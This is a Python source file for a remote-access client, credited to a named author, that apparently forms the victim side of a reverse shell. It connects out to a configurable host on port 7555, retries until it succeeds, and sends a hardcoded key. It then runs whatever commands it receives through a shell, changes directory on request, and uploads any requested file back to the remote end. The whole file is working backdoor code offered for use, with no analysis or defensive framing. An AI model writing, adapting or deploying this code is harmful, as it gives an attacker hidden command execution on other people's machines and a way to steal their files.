#!usr/bind/python
#-*- coding: utf-8 -*-

__autor__ = "Jhonatan Leonardo Zuluaga Torres "
__copyright__ = "Copyright 2018, Jhonatan Zu"
__credits__ = "Jhonatan Zu"
__license__ = "GPL"
__version__ = "1.0.1"
__maintainer__ = "Jhonatan Zu"
__email__ = "jhonatan.zero@gmail.com"
__status__ = "Developer"


import os, socket, time
from subprocess import *  


class Remote:
	def __init__(self):
		self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.key = b'key' 
		self.host = '###localhost###' 
		self.port = 7555

	def conection(self):
		while 1:
			try:
				self.conn.connect((self.host, self.port)) 
				self.conn.send(b'Successfully established connection ') 
				time.sleep(0.4)
				self.authenticate(self.conn) 
				break
			except Exception as e: 
				print(e)  
				pass

	def authenticate(self,conex): 
		#print("----ññññ--ññ")
		conex.send(self.key) 
		#print("xxxxxxxxxxxxxxxxx")
		self.receiver(conex)

	def receiver(self, conex): 
		#print (' en back\n')
		while 1:
			back_output = '*|*'
			comand = conex.recv(4096).decode('utf-8') 
			if comand.startswith('cd '):
				change = comand.replace('cd ','') 
				try:
					os.chdir(change) 
				except:
					conex.send(b'->The directory was not found')
					time.sleep(0.5)
			elif comand.startswith('download '): 
				#print('Rastreo 1')
				required_file = comand.replace('download ', '') 
				open_file = open(required_file, 'rb')
				reading_file = open_file.read()
				print('es tipo..',type(len(reading_file)))
				conex.send(str(len(reading_file)).encode()) 
				confirmation = conex.recv(2).decode('utf-8') 
				print(confirmation)
				if confirmation == 'ok': 
					conex.send(reading_file)
					end =conex.recv(3).decode()
					print (end)
					while end != 'end': 
						pass
					#print('ALERTA 1')
			else:
				convert_to_list = comand.split()  
				#print ("nivel 1 FUERA DEL check_output")	
				try:
					back_output = check_output(convert_to_list, shell=True) 				
					conex.send(back_output)			
					time.sleep(0.4)
					back_output = '*|*'				
				except:
					conex.send("-[{0}] is not a valid command-".format(comand).encode()) 	
			if back_output == '*|*': 
				conex.send(back_output.encode())         





play = Remote()
play.conection()

